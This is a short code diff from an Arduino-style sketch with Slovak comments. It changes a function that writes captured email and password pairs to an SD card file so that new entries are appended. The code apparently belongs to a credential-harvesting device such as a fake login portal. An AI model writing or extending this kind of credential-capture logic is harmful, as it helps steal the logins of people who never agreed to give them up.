@@ -75,7 +75,7 @@ void displayCredentials(String email, String password) {
 
 // Funkcia na uloženie údajov na SD kartu
 void saveCredentialsToSD(String email, String password) {
-  File dataFile = SD.open("/htmldata.txt", FILE_WRITE);  // Otvoríme súbor na zápis
+  File dataFile = SD.open("/htmldata.txt", FILE_APPEND);  // Otvoríme súbor na zápis
 
   if (dataFile) {
     dataFile.println("New Credentials:");
